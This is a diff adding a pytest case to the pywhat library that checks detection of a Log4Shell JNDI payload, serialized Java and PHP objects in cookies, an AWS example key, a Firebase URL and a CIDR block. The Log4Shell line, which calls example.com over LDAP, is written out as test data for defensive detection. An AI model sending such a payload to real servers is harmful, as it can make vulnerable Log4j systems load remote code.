@@ -1,5 +1,7 @@
 import re
 
+import pytest
+
 from pywhat import identifier
 from pywhat.filter import Distribution, Filter
 from pywhat.helper import Keys
@@ -130,3 +132,47 @@ def test_finditer():
     out = r.identify("anon@random.org dad@gmail.com")
     assert "anon@random.org" in out["Regexes"]["text"][2]["Matched"]
     assert "dad@gmail.com" in out["Regexes"]["text"][3]["Matched"]
+
+
+@pytest.mark.parametrize(
+    "text, name, matched",
+    [
+        (
+            'GET /?q=${jndi:ldap://example.com/a} HTTP/1.1" 200',
+            "Log4Shell (Log4j JNDI Lookup) Payload",
+            "${jndi:ldap://example.com/a}",
+        ),
+        (
+            "databaseURL: 'https://pywhat-test.firebaseio.com',",
+            "Firebase Realtime Database URL",
+            "https://pywhat-test.firebaseio.com",
+        ),
+        (
+            "Cookie: session=rO0ABXQABWhlbGxv; path=/",
+            "Base64 Encoded Java Serialized Object",
+            "rO0ABXQABWhlbGxv",
+        ),
+        (
+            "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n",
+            "Amazon Web Services Access Key",
+            "AKIAIOSFODNN7EXAMPLE",
+        ),
+        (
+            "ingress allowed from 10.0.0.0/8 only",
+            "Internet Protocol (IP) Address Version 4 CIDR Block",
+            "10.0.0.0/8",
+        ),
+        (
+            'Cookie: data=a:1:{s:4:"user";O:8:"stdClass":1:{s:2:"id";i:42;}}; path=/',
+            "PHP Serialized Object",
+            'a:1:{s:4:"user";O:8:"stdClass":1:{s:2:"id";i:42;}}',
+        ),
+    ],
+)
+def test_boundaryless_gf_regexes(text, name, matched):
+    r = identifier.Identifier(boundaryless=Filter())
+    out = r.identify(text)
+    assert any(
+        match["Regex Pattern"]["Name"] == name and match["Matched"] == matched
+        for match in out["Regexes"]["text"]
+    )
